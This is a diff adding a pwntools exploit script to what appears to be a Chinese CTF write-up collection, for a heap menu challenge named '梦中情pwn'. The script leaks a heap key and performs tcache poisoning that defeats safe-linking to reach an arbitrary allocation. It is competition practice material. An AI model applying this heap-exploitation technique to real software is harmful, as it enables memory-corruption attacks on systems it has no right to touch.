@@ -288,5 +288,82 @@ p.interactive()
 ```
 ## 梦中情pwn | Working | CrazyCat
 类似堆的菜单题，flag从环境变量中读取
-```pytho
+```python
+from pwn import *
+from wstube import websocket
+import sys
+
+context(arch='amd64', os='linux', log_level='debug')
+local = True if len(sys.argv) == 1 else False
+elf_path = './' + sys.argv[0][:-3]
+libc_path = './'
+if local:
+    p = process(elf_path, env={"FLAG": "test_flag"})
+else:
+    ip, port = ':'.split(':')
+    p = remote(ip, port)
+    # p = websocket("")
+
+def debug():
+    if local:
+        gdb.attach(p, '''
+            b main
+            b recall_memory
+            b erase_memory
+            b implant_user_memory
+        ''')
+
+def choice(idx):
+    p.recvuntil(b"space\n\n")
+    p.sendline(str(idx).encode())
+
+def add(content):
+    choice(1)
+    p.recvuntil(b"characters).\n")
+    p.sendline(content)
+
+def show(idx):
+    choice(2)
+    p.recvuntil(b"access:\n")
+    p.sendline(str(idx).encode())
+
+def delete(idx):
+    choice(3)
+    p.recvuntil(b"access:\n")
+    p.sendline(str(idx).encode())
+
+for i in range(8):
+    add(b"A" * 0x8)
+for i in range(7):
+    delete(7 - i)
+delete(8)
+for i in range(7):
+    add(b"A" * 0x8)
+show(8)
+p.recvuntil(b'Reliving a slice of a dream...\n')
+key = u64(p.recv(7).ljust(8, b'\x00')) >> 16
+heap = key << 12
+delete(8)
+fake_fd = key
+add(p64(fake_fd))
+add(b'a' * 0x8)
+add(b'b' * 0x8)
+for i in range(7):
+    delete(7 - i)
+delete(8)
+delete(10)
+delete(9)
+for i in range(7):
+    add(b"A" * 0x8)
+fake_fd = (heap + 0x2a0) ^ key
+add(p64(fake_fd))
+add(b'a' * 0x8)
+add(b'b' * 0x8)
+add(b'c' * 0x8 + p64(heap + 0x330))
+show(1)
+debug()
+
+p.interactive()
+
+
 ```
